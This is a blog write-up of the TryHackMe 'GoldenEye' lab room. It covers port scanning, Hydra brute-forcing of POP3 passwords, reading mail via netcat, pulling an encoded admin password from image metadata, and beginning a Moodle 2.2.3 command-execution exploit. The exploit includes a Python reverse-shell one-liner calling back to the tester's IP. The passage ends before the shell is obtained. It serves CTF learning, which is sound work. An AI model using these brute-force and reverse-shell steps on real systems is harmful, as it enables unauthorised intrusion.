@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <!-- Document Settings -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Base Meta -->
+    <!-- dynamically fixing the title for tag/author pages -->
+
+
+
+    <title>GoldenEye Write Up</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Styles'n'Scripts -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+
+    <!--[if IE]>
+        <style>
+            p, ol, ul{
+                width: 100%;
+            }
+            blockquote{
+                width: 100%;
+            }
+        </style>
+    <![endif]-->
+    
+    <!-- This tag outputs SEO meta+structured data and other important settings -->
+    <meta name="description" content="Infosec | Hacking | CTF" />
+    <link rel="shortcut icon" href="https://darrynbrownfield.co.uk/assets/images/favicon.png" type="image/png" />
+    <link rel="canonical" href="https://darrynbrownfield.co.uk/goldeneye" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+
+     <!--title below is coming from _includes/dynamic_title-->
+    <meta property="og:site_name" content="Darryn Brownfield" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="GoldenEye Write Up" />
+    <meta property="og:description" content="Overview goldeneye is a medium rated CTF room on TryHackMe. The machine was pretty easy, it just needed good enumeration. Nmap I deployed the machine and started a NMAP scan to check the available ports. └──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.50.94 Starting Nmap 7.80 ( https://nmap.org ) at" />
+    <meta property="og:url" content="https://darrynbrownfield.co.uk/goldeneye" />
+    <meta property="og:image" content="https://darrynbrownfield.co.uk/assets/images/goldeneye/cover.png" />
+    <meta property="article:publisher" content="https://www.facebook.com/" />
+    <meta property="article:author" content="https://www.facebook.com/" />
+    <meta property="article:published_time" content="2021-06-27T00:00:00+00:00" />
+    <meta property="article:modified_time" content="2021-06-27T00:00:00+00:00" />
+    <meta property="article:tag" content="Tryhackme" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="GoldenEye Write Up" />
+    <meta name="twitter:description" content="Overview goldeneye is a medium rated CTF room on TryHackMe. The machine was pretty easy, it just needed good enumeration. Nmap I deployed the machine and started a NMAP scan to check the available ports. └──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.50.94 Starting Nmap 7.80 ( https://nmap.org ) at" />
+    <meta name="twitter:url" content="https://darrynbrownfield.co.uk/" />
+    <meta name="twitter:image" content="https://darrynbrownfield.co.uk/assets/images/goldeneye/cover.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Darryn Brownfield" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Tryhackme" />
+    <meta name="twitter:site" content="@dazbrownfield" />
+    <meta name="twitter:creator" content="@dazbrownfield" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="933" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Website",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Darryn Brownfield",
+        "logo": "https://darrynbrownfield.co.uk/assets/images/blog-icon.png"
+    },
+    "url": "https://darrynbrownfield.co.uk/goldeneye",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://darrynbrownfield.co.uk/assets/images/goldeneye/cover.png",
+        "width": 2000,
+        "height": 666
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://darrynbrownfield.co.uk/goldeneye"
+    },
+    "description": "Overview goldeneye is a medium rated CTF room on TryHackMe. The machine was pretty easy, it just needed good enumeration. Nmap I deployed the machine and started a NMAP scan to check the available ports. └──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.50.94 Starting Nmap 7.80 ( https://nmap.org ) at"
+}
+    </script>
+
+    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
+    <script type="text/javascript">
+    ghost.init({
+    	clientId: "ghost-frontend",
+    	clientSecret: "f84a07a72b17"
+    });
+    </script> -->
+
+    <meta name="generator" content="Jekyll 3.6.2" />
+    <link rel="alternate" type="application/rss+xml" title="GoldenEye Write Up" href="/feed.xml" />
+
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
+        <!-- default -->
+
+<!-- The tag above means: insert everything in this file
+into the {body} of the default.hbs template -->
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+        
+            
+
+            
+        
+        
+            <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
+    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
+    <li class="nav-getting-started" role="menuitem"><a href="/tag/ctf/">CTF</a></li>
+</ul>
+
+        
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+            
+            <a
+              class="social-link social-link-tw"
+              href="https://github.com/darrynb89"
+              target="_blank"
+              rel="noopener"
+              ><svg
+  version="1.0"
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 120.000000 120.000000"
+>
+  <g
+    transform="translate(0.000000,120.000000) scale(0.0900000,-0.0900000)"
+    fill="#ffffff"
+    stroke="none"
+  >
+    <path
+      d="M441 1174 c-105 -28 -181 -73 -266 -159 -125 -124 -175 -246 -175
+-425 0 -179 50 -300 175 -425 85 -85 185 -145 243 -145 36 0 42 13 42 89 l0
+57 -57 -3 c-74 -5 -117 17 -150 78 -13 24 -37 56 -54 71 -34 33 -36 38 -9 38
+12 0 20 -7 20 -16 0 -10 6 -14 14 -11 10 4 13 1 9 -9 -3 -10 2 -14 18 -14 18
+0 20 -3 10 -9 -16 -11 -4 -34 14 -27 9 3 11 -2 7 -16 -4 -18 -2 -20 21 -14 20
+5 25 3 21 -8 -9 -23 17 -31 33 -11 12 17 13 17 13 2 0 -11 8 -17 21 -17 15 0
+19 5 15 15 -3 8 -1 15 4 15 6 0 10 -7 10 -15 0 -8 7 -15 15 -15 8 0 15 8 15
+18 0 10 10 39 23 64 l23 46 -59 13 c-136 28 -210 123 -211 268 -1 66 3 82 27
+124 23 39 27 55 22 86 -7 40 9 121 24 121 18 0 78 -25 113 -46 30 -19 42 -22
+70 -14 18 6 71 10 118 10 47 0 100 -4 118 -10 28 -8 40 -5 70 14 35 21 95 46
+113 46 15 0 31 -81 24 -121 -5 -31 -1 -47 22 -86 24 -42 28 -58 27 -123 -1
+-147 -65 -231 -203 -266 l-68 -18 18 -30 c15 -25 19 -51 19 -138 0 -58 3 -113
+6 -122 20 -52 166 16 279 129 125 125 175 246 175 425 0 179 -50 301 -175 425
+-86 87 -161 131 -270 160 -75 19 -241 19 -314 -1z"
+    />
+  </g>
+</svg></a
+            >
+            
+            <a
+              class="social-link social-link-li"
+              href="https://www.linkedin.com/in/darryn-brownfield-0b1132b5"
+              target="_blank"
+              rel="noopener"
+              ><svg viewBox="0 50 512 512">
+    <g transform="translate(0.000000,20.000000) scale(1.1)">
+      <path
+        d="M150.65,100.682c0,27.992-22.508,50.683-50.273,50.683c-27.765,0-50.273-22.691-50.273-50.683
+      C50.104,72.691,72.612,50,100.377,50C128.143,50,150.65,72.691,150.65,100.682z M143.294,187.333H58.277V462h85.017V187.333z
+      M279.195,187.333h-81.541V462h81.541c0,0,0-101.877,0-144.181c0-38.624,17.779-61.615,51.807-61.615
+      c31.268,0,46.289,22.071,46.289,61.615c0,39.545,0,144.181,0,144.181h84.605c0,0,0-100.344,0-173.915
+      s-41.689-109.131-99.934-109.131s-82.768,45.369-82.768,45.369V187.333z"
+      />
+    </g>
+  </svg></a
+            >
+             
+            <a
+              class="social-link social-link-tw"
+              href="https://twitter.com/dazbrownfield"
+              target="_blank"
+              rel="noopener"
+              ><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a
+            >
+             
+          </div>
+</nav>
+
+    </div>
+</header>
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+
+        <article class="post-full  tag-tryhackme tag-ctf tag-medium post ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime="27 June 2021">27 June 2021</time>
+                    
+                        <span class="date-divider">/</span>
+                        
+                            
+                               <a href='/tag/tryhackme/'>TRYHACKME</a>,
+                            
+                        
+                            
+                               <a href='/tag/ctf/'>CTF</a>,
+                            
+                        
+                            
+                               <a href='/tag/medium/'>MEDIUM</a>
+                            
+                        
+                    
+                </section>
+                <h1 class="post-full-title">GoldenEye Write Up</h1>
+            </header>
+
+            <section class="post-full-content">
+                <div class="kg-card-markdown">
+                    <p><img src="/assets/images/goldeneye/cover.png" alt="cover" /></p>
+
+<h3 id="overview">Overview</h3>
+
+<p><a href="https://tryhackme.com/room/goldeneye">goldeneye</a> is a medium rated CTF room on <a href="https://tryhackme.com">TryHackMe</a>. The machine was pretty easy, it just needed good enumeration.</p>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>I deployed the machine and started a NMAP scan to check the available ports.</p>
+
+<pre><code class="language-highlight">└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.50.94
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 11:39 BST
+Nmap scan report for 10.10.50.94
+Host is up (0.031s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+|_ssl-date: TLS randomness does not represent time
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: GoldenEye Primary Admin Server
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.44 seconds
+</code></pre>
+
+<p>2 Ports open:</p>
+
+<ul>
+  <li>25 - smtp - Postfix smtpd</li>
+  <li>80 - HTTP - Apache httpd 2.4.7</li>
+</ul>
+
+<p>I ran a full port scan and found 2 more ports.</p>
+
+<pre><code class="language-highlight">└──╼ $sudo nmap -p- -oA nmap/allports 10.10.50.94
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 11:40 BST
+Nmap scan report for 10.10.50.94
+Host is up (0.034s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE
+25/tcp    open  smtp
+80/tcp    open  http
+55006/tcp open  unknown
+55007/tcp open  unknown
+</code></pre>
+
+<p>I then completed a targeted scan against the 4 ports.</p>
+
+<pre><code class="language-highlight">└──╼ $sudo nmap -p 25,80,55006,55007 -sC -sV -oA nmap/targeted 10.10.50.94
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 11:54 BST
+Nmap scan report for 10.10.50.94
+Host is up (0.030s latency).
+
+PORT      STATE SERVICE     VERSION
+25/tcp    open  smtp        Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+|_ssl-date: TLS randomness does not represent time
+80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: GoldenEye Primary Admin Server
+55006/tcp open  ssl/unknown
+|_ssl-date: TLS randomness does not represent time
+55007/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: UIDL USER RESP-CODES AUTH-RESP-CODE SASL(PLAIN) CAPA STLS PIPELINING TOP
+|_ssl-date: TLS randomness does not represent time
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 109.38 seconds
+</code></pre>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>I started by looking at the HTTP port.</p>
+
+<p><img src="/assets/images/goldeneye/webpage.png" alt="webpage" /></p>
+
+<p>The webpage tells us to go to /sev-home/ however the page is password protected and currently I have no usernames or password.</p>
+
+<p><img src="/assets/images/goldeneye/loginprompt.png" alt="loginprompt" /></p>
+
+<p>I checked the source code for the webpage.</p>
+
+<pre><code class="language-highlight">&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;GoldenEye Primary Admin Server&lt;/title&gt;
+&lt;link rel="stylesheet" href="index.css"&gt;
+&lt;/head&gt;
+
+	&lt;span id="GoldenEyeText" class="typeing"&gt;&lt;/span&gt;&lt;span class='blinker'&gt;&amp;#32;&lt;/span&gt;
+
+&lt;script src="terminal.js"&gt;&lt;/script&gt;
+	
+&lt;/html&gt;
+</code></pre>
+
+<p>Not a great deal in there but there is a javascript file.</p>
+
+<pre><code class="language-highlight">var data = [
+  {
+    GoldenEyeText: "&lt;span&gt;&lt;br/&gt;Severnaya Auxiliary Control Station&lt;br/&gt;****TOP SECRET ACCESS****&lt;br/&gt;Accessing Server Identity&lt;br/&gt;Server Name:....................&lt;br/&gt;GOLDENEYE&lt;br/&gt;&lt;br/&gt;User: UNKNOWN&lt;br/&gt;&lt;span&gt;Naviagate to /sev-home/ to login&lt;/span&gt;"
+  }
+];
+
+//
+//Boris, make sure you update your default password. 
+//My sources say MI6 maybe planning to infiltrate. 
+//Be on the lookout for any suspicious network traffic....
+//
+//I encoded you p@ssword below...
+//
+//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;
+//
+//BTW Natalya says she can break your codes
+//
+
+var allElements = document.getElementsByClassName("typeing");
+for (var j = 0; j &lt; allElements.length; j++) {
+  var currentElementId = allElements[j].id;
+  var currentElementIdContent = data[0][currentElementId];
+  var element = document.getElementById(currentElementId);
+  var devTypeText = currentElementIdContent;
+
+ 
+  var i = 0, isTag, text;
+  (function type() {
+    text = devTypeText.slice(0, ++i);
+    if (text === devTypeText) return;
+    element.innerHTML = text + `&lt;span class='blinker'&gt;&amp;#32;&lt;/span&gt;`;
+    var char = text.slice(-1);
+    if (char === "&lt;") isTag = true;
+    if (char === "&gt;") isTag = false;
+    if (isTag) return type();
+    setTimeout(type, 60);
+  })();
+}
+</code></pre>
+
+<p>Few things to note in here, we have 2 names (boris, natalya) and an encoded password. I went to <a href="https://gchq.github.io/CyberChef/">Cyber Chef</a> to decode the password. Using the magic function the string is decoded from HTLM Entity to clear text.</p>
+
+<p><img src="/assets/images/goldeneye/cyberchefjscode.png" alt="cyberchefjscode" /></p>
+
+<p>Using the the username ‘boris’ and password from cyberchef I can now login to the webpage.</p>
+
+<p><img src="/assets/images/goldeneye/loggedinwebpage.png" alt="loggedinwebpage" /></p>
+
+<blockquote>
+  <p>GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)</p>
+
+  <p>Please email a qualified GNO supervisor to receive the online <strong>GoldenEye Operators Training</strong> to become an Administrator of the GoldenEye system</p>
+
+  <p>Remember, since <strong><em>security by obscurity</em></strong> is very effective, we have configured our pop3 service to run on a very high non-default port</p>
+</blockquote>
+
+<p>Its now time to turn attention to the smtp/pop3 ports.</p>
+
+<h3 id="email-enumeration">Email Enumeration</h3>
+
+<p>Reviewing the nmap output, port 25 SMTP allows the VRFY command however not AUTH. Port 55007 POP3 does allow authentication, I tried to login using the credentials found for boris but they didnt work.</p>
+
+<p><img src="/assets/images/goldeneye/pop3boris.png" alt="pop3boris" /></p>
+
+<p>Using Hydra I was able to brute force boris’s password.</p>
+
+<blockquote>
+  <p>Normaly I would use rockyou.txt however after around 30 minutes I had no hits so swapped to the much smaller wordlist fasttrack and got a hit after a minute or so.</p>
+</blockquote>
+
+<pre><code class="language-highlight">└──╼ $hydra -l boris -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.50.94 pop3
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-27 12:00:47
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking pop3://10.10.50.94:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+[STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active
+[55007][pop3] host: 10.10.50.94   login: boris   password: &lt;&lt;redacted&gt;&gt;
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-27 12:03:34
+</code></pre>
+
+<p>I repeated the process for natalya.</p>
+
+<pre><code class="language-highlight">└──╼ $hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.50.94 pop3
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-27 12:05:44
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking pop3://10.10.50.94:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+[55007][pop3] host: 10.10.50.94   login: natalya   password: &lt;&lt;redacted&gt;&gt;
+[STATUS] 111.00 tries/min, 222 tries in 00:02h, 1 to do in 00:01h, 15 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-27 12:07:45
+</code></pre>
+
+<p>Now I had some credentials it was time to login and check for any email messages, to do this I used netcat to connect to the POP3 service and authentication and use the ‘LIST’ and ‘RETR’ commands to list and retrieve messages.</p>
+
+<blockquote>
+  <p>A list of POP3 commands can be found <a href="https://www.shellhacks.com/retrieve-email-pop3-server-command-line/">here</a></p>
+</blockquote>
+
+<pre><code class="language-highlight">└──╼ $nc 10.10.50.94 55007
++OK GoldenEye POP3 Electronic-Mail System
+USER boris
++OK
+PASS &lt;&lt;redacted&gt;&gt;
++OK Logged in.
+list
++OK 3 messages:
+1 544
+2 373
+3 921
+.
+RETR 1
++OK 544 octets
+Return-Path: &lt;root@127.0.0.1.goldeneye&gt;
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id D9E47454B1
+        for &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;
+Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+From: root@127.0.0.1.goldeneye
+
+Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the ot
+her admins here.
+.
+RETR 2
++OK 373 octets
+Return-Path: &lt;natalya@ubuntu&gt;
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id C3F2B454B1
+        for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;
+Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+From: natalya@ubuntu
+
+Boris, I can break your codes!
+.
+RETR 3
++OK 921 octets
+Return-Path: &lt;alec@janus.boss&gt;
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from janus (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
+        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;
+Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+From: alec@janus.boss
+
+Boris,
+
+Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this s
+erver then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and capture
+d our plan will crash and burn!
+
+Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
+
+PS - Keep security tight or we will be compromised.
+
+.
+</code></pre>
+
+<p>I repeated the same process for natalya.</p>
+
+<pre><code class="language-highlight">└──╼ $nc 10.10.50.94 55007
++OK GoldenEye POP3 Electronic-Mail System
+user natalya
++OK
+pass &lt;&lt;redacted&gt;&gt;
++OK Logged in.
+list
++OK 2 messages:
+1 631
+2 1048
+.
+retr 1
++OK 631 octets
+Return-Path: &lt;root@ubuntu&gt;
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id D5EDA454B1
+        for &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu&gt;
+Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+From: root@ubuntu
+
+Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.
+
+Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
+.
+RETR 2
++OK 1048 octets
+Return-Path: &lt;root@ubuntu&gt;
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id 17C96454B1
+        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;
+Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+From: root@ubuntu
+
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even
+ if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)
+
+Ok, user creds are:
+
+username: xenia
+password: &lt;&lt;redacted&gt;&gt;
+
+Boris verified her as a valid contractor so just create the account ok?
+
+And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+**Make sure to edit your host file since you usually work remote off-network....
+
+Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+
+
+.
+
+</code></pre>
+
+<p>Great more credentials and a new HTTP endpoint. I added the details to my /etc/hosts file and navigated to http://severnaya-station.com/gnocertdir/</p>
+
+<p><img src="/assets/images/goldeneye/moodle.png" alt="moodle" /></p>
+
+<p>Logging in as xenia a message notification popped up, using the notification I was navigated to the users messages.</p>
+
+<p><img src="/assets/images/goldeneye/xeniamessage.png" alt="xeniamessage" /></p>
+
+<p>A new email username is ‘doak’</p>
+
+<pre><code class="language-highlight">└──╼ $hydra -l doak -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.50.94 pop3
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-27 12:16:54
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking pop3://10.10.50.94:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
+[55007][pop3] host: 10.10.50.94   login: doak   password: goat
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-27 12:19:23
+</code></pre>
+
+<p>Repeating the same process as before, I brute forced the users password and logged in to POP3 service to check for messages.</p>
+
+<pre><code class="language-highlight">└──╼ $nc 10.10.50.94 55007
++OK GoldenEye POP3 Electronic-Mail System
+user doak
++OK
+pass &lt;&lt;redacted&gt;&gt;
++OK Logged in.
+list
++OK 1 messages:
+1 606
+.
+RETR 1
++OK 606 octets
+Return-Path: &lt;doak@ubuntu&gt;
+X-Original-To: doak
+Delivered-To: doak@ubuntu
+Received: from doak (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id 97DC24549D
+        for &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;
+Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+From: doak@ubuntu
+
+James,
+If you're reading this, congrats you've gotten this far. You know how tradecraft works right?
+
+Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......
+
+username: dr_doak
+password: &lt;&lt;redacted&gt;&gt;
+
+.
+</code></pre>
+
+<p>I logged out of http://severnaya-station.com/gnocertdir/ as xenia and logged in as dr_doak. Looking around the webpage I found private files for james.</p>
+
+<p><img src="/assets/images/goldeneye/privatefiles.png" alt="privatefiles" /></p>
+
+<p>I downloaded the file to my machine.</p>
+
+<pre><code class="language-highlight">└──╼ $cat s3cret.txt 
+007,
+
+I was able to capture this apps adm1n cr3ds through clear txt. 
+
+Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 
+
+Something juicy is located here: /dir007key/for-007.jpg
+
+Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
+</code></pre>
+
+<p>Navigating to http://severnaya-station.com/dir007key/for-007.jpg I found an image:</p>
+
+<p><img src="/assets/images/goldeneye/for-007.jpg" alt="007" /></p>
+
+<p>I downloaded the file and used exiftools to check for any credentials.</p>
+
+<pre><code class="language-highlight">└──╼ $exiftool for-007.jpg 
+ExifTool Version Number         : 11.97
+File Name                       : for-007.jpg
+Directory                       : .
+File Size                       : 15 kB
+File Modification Date/Time     : 2021:06:27 12:27:18+01:00
+File Access Date/Time           : 2021:06:27 12:27:18+01:00
+File Inode Change Date/Time     : 2021:06:27 12:27:18+01:00
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+X Resolution                    : 300
+Y Resolution                    : 300
+Exif Byte Order                 : Big-endian (Motorola, MM)
+Image Description               : eFdpbnRlcjE5OTV4IQ==
+Make                            : GoldenEye
+Resolution Unit                 : inches
+Software                        : linux
+Artist                          : For James
+Y Cb Cr Positioning             : Centered
+Exif Version                    : 0231
+Components Configuration        : Y, Cb, Cr, -
+User Comment                    : For 007
+Flashpix Version                : 0100
+Image Width                     : 313
+Image Height                    : 212
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+Image Size                      : 313x212
+Megapixels                      : 0.066
+</code></pre>
+
+<p>The image description looks like base64 so using the command <code class="highlighter-rouge">echo -n "eFdpbnRlcjE5OTV4IQ==" | base64 -d</code> I was able to retrieve the admin password.</p>
+
+<h3 id="shell">Shell</h3>
+
+<p>As an admin on moodle we get a lot more options, the moodle version is 2.2.3, googleing for ‘moodle 2.2.3 exploit’, the first result provides an <a href="https://www.rapid7.com/db/modules/exploit/multi/http/moodle_cmd_exec/">exploit</a> using the spell check function. Reading the source code it looks fairly straight forward so I decided to do manualy rather than use Metasploit.</p>
+
+<p>First I updated the system path with the payload <code class="highlighter-rouge">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;&lt;local machine IP&gt;&gt;",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></p>
+
+<p><img src="/assets/images/goldeneye/systempath.png" alt="systempath" /></p>
+
+<p>Next I changed the shell engine to use ‘PSpellShell’.</p>
+
